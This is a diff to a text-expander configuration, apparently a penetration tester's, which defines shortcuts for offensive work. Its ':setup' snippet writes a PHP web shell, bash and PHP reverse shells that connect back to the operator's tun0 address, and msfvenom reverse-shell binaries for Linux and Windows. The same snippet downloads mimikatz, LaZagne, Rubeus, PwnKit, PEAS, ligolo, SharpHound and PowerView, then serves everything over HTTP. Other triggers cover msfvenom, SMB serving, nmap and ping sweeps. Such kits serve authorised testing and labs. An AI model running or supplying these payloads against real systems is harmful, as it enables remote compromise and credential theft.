@@ -8,8 +8,8 @@ global_vars:
   - name: "IP"
     type: "shell"
     params:
-      cmd: "ip a | grep -q tun0 && hostname -I | awk '{print $(NF-1)}' || hostname -I | awk '{print $1}'"
-
+      cmd: 'ip a show tun0 | grep -oP ''inet \K[\d.]+'' || hostname -I | awk ''{print $1}'''
+      
   - name: "ssh_key"
     type: "shell"
     params:
@@ -22,29 +22,38 @@ matches:
                   
 # SETUP AND NMAP              
   - trigger: ":setup"                  
-    replace : |          
-      mkdir -p net && cd net         
-      echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php
-      echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'\"); ?>" > rev.php
+    replace : |
+      mkdir -p server && cd server
+      echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > wshell.php
+
+      mkdir -p linux && cd linux       
       echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'" > shell.sh
-      msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f elf -o shell86.elf &
-      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f elf -o shell64.elf &
-      msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f exe -o shell86.exe &
-      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f exe -o shell64.exe &
-      cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . &
+      echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'\"); ?>" > linrev.php
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh & 
-      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O wp.exe & 
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
+      msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f elf -o shell86.elf &
+      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f elf -o shell64.elf &
+      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit &
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &
+
+
+      mkdir -p ../windows & cd ../windows
+      
+      msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=445 -f exe -o shell86.exe &
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=445 -f exe -o shell64.exe &
+      cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . &
+      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O wp.exe & 
+      wget -q https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/winPEAS.bat -O wp.bat &
+
       wget -q https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip && unzip SharpHound-v1.1.0.zip &
       wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
       wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe &
       wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
-      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit &
-      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
-      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &
       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &
-      sudo python3 -m http.server 80
+      
+      cd .. && sudo python3 -m http.server 80
 
   - trigger: ":msfwin"
     replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=22 -f exe -o shell.exe LHOST=
@@ -62,7 +71,7 @@ matches:
     replace: "impacket-smbserver -smb2support share ."
 
   - trigger: ":pyserver"
-    replace: "python3 -m http.sever "
+    replace: "python3 -m http.server "
   
   - trigger: ":phpserver"
     replace: "php -S 0.0.0.0:"
@@ -75,7 +84,7 @@ matches:
 
 # ENUMERATION
   - trigger: ":nmap"
-    replace: sudo nmap -A -sC -sV -v -o nmap -T4 
+    replace: sudo nmap -T4 -A -v -o nmap --min-rate 1000 
 
   - trigger: ":lping"
     replace: for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
